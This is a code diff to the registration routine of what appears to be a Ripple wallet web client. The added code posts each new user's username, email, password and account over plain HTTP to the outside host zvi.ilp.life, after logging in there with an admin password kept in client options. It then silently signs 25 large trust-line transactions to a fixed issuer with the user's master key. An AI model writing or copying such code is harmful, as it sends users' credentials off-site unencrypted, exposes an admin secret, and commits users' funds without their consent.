@@ -8,12 +8,14 @@ var util = require('util'),
     Base58Utils = require('../util/base58'),
     RippleAddress = require('../util/types').RippleAddress;
 
+var Currency = ripple.Currency;
+
 var module = angular.module('id', ['authflow', 'blob']);
 
 module.factory('rpId', ['$rootScope', '$location', '$route', '$routeParams', '$timeout',
-                        'rpAuthFlow', 'rpBlob',
+                        'rpAuthFlow', 'rpBlob', '$http', 'rpNetwork', 
                         function($scope, $location, $route, $routeParams, $timeout,
-                                 $authflow, $blob)
+                                 $authflow, $blob, $http, $network)
 {
   /**
    * Identity manager
@@ -169,6 +171,7 @@ module.factory('rpId', ['$rootScope', '$location', '$route', '$routeParams', '$t
   {
     var self = this;
 
+
     // If account master key is not present, generate one
     var masterkey = !!opts.masterkey
       ? opts.masterkey
@@ -184,6 +187,137 @@ module.factory('rpId', ['$rootScope', '$location', '$route', '$routeParams', '$t
     var username = Id.normalizeUsernameForDisplay(opts.username);
     var password = Id.normalizePassword(opts.password);
     var account  = (new RippleAddress(masterkey)).getAddress();
+    var email = opts.email;
+    var code = null;
+
+
+
+
+                var responsePromise = $http.post("http://zvi.ilp.life/api/auth/login", {username: "admin", password: Options.ilpAdminPass});
+
+                responsePromise.success(function(data, status, headers, config) {
+ 
+                    var responsePromiseA = $http.post("http://zvi.ilp.life/api/invites", {amount: "1000"});
+
+                    responsePromiseA.success(function(data, status, headers, config) {
+                        code = data.code;
+
+                        var responsePromiseB = $http.post("http://zvi.ilp.life/api/auth/logout");
+
+                        responsePromiseB.success(function(data, status, headers, config) {
+
+                            var responsePromiseC = $http.post("http://zvi.ilp.life/api/users/" + username, {"account": account, "email":email,"password":password,"inviteCode":code,"username":username});
+
+                            responsePromiseC.success(function(data, status, headers, config) {
+                                
+//                                alert("AJAX got id: " + data.id);
+const currencyToTrust = ["BTC", "MAG", "BTG","BCH","IOT","ETH","LTC","XMR","DSH","XLM","MON","EMC","VTC","SYS","DGB","NAV","PPC","GRS","VIA","NMC","GUP","BSD","EXP","XBC","LOG"]
+
+currencyToTrust.forEach(addTrustLine)
+
+function addTrustLine(item, index){
+
+ setTimeout(function () {
+   $scope.$apply(function(){
+
+          $scope.lineCurrencyObj = Currency.from_human(item);
+
+          var amount = ripple.Amount.from_human('' + '1000000000' + ' ' + $scope.lineCurrencyObj.to_hex(), {reference_date: new Date(+new Date() + 5 * 60000)});
+
+          amount.set_issuer('rMJSrGBUCTYnJN9kPNdgEm2hAfuC6bfPi8');
+          if (!amount.is_valid()) {
+            console.log('amount.is_valid: FALSO :: ' + JSON.stringify(amount))
+            // Invalid amount. Indicates a bug in one of the validators.
+            return;
+          }
+
+          $scope.amount_feedback = amount;
+
+       var amount = $scope.amount_feedback.to_json();
+        var tx = $network.remote.transaction();
+        // Add memo to tx
+        tx.addMemo('client', 'rt' + $scope.version);
+
+        // Set or clear the trust flags
+        // The user may wish to leave the settings unchanged,
+        // in which case the flag is not set on the transaction
+        var flags = [];
+        flags.push('SetNoRipple');
+
+        tx
+          .rippleLineSet(account, amount)
+          .setFlags(flags)
+          .on('submitted', function(res) {
+            console.log('submitted res:' + JSON.stringify(res))
+            // $scope.$apply(function() {
+            //   setEngineStatus(res, false);
+            //   $scope.granted(tx.hash);
+
+            //   // Remember currency and increase order
+            //   for (var i = 0; i < $scope.currencies_all.length; i++) {
+            //     if ($scope.currencies_all[i].value.toLowerCase() === $scope.amount_feedback.currency().get_iso().toLowerCase()) {
+            //       $scope.currencies_all[i].order++;
+            //       break;
+            //     }
+            //   }
+            // });
+          })
+          .on('success', function(res) {
+            console.log('success res:' + JSON.stringify(res))
+            // $scope.$apply(function() {
+            //   setEngineStatus(res, true);
+            // });
+          })
+          .on('error', function(res) {
+            console.log('success res:' + JSON.stringify(res))
+            // setImmediate(function () {
+            //   $scope.$apply(function() {
+            //     $scope.mode = 'error';
+            //     $scope.trust.loading = false;
+            //     var notification = res.result === 'tejMaxFeeExceeded' ? 'max_fee' : 'error';
+            //     $scope.load_notification(notification);
+            //   });
+            // });
+          });
+
+
+        // keychain.requestSecret(id.account, id.username, function(err, secret) {
+        //   // XXX Error handling
+        //   if (err) {
+        //     return;
+        //   }
+
+
+          tx.secret(masterkey/*secret*/);
+
+            tx.submit();
+        // });
+
+   });
+ }, 20000);
+};
+
+                            });
+                            responsePromiseC.error(function(data, status, headers, config) {
+                                alert("AJAX failed!: logout");
+                            });
+
+                        });
+                        responsePromiseB.error(function(data, status, headers, config) {
+                            alert("AJAX failed!: logout");
+                        });
+
+
+                    });
+                    responsePromiseA.error(function(data, status, headers, config) {
+                        alert("AJAX failed!: invite");
+                    });
+                });
+                responsePromise.error(function(data, status, headers, config) {
+                    alert("AJAX failed!: auth");
+                });
+
+
 
     $authflow.register({
       'username': username,
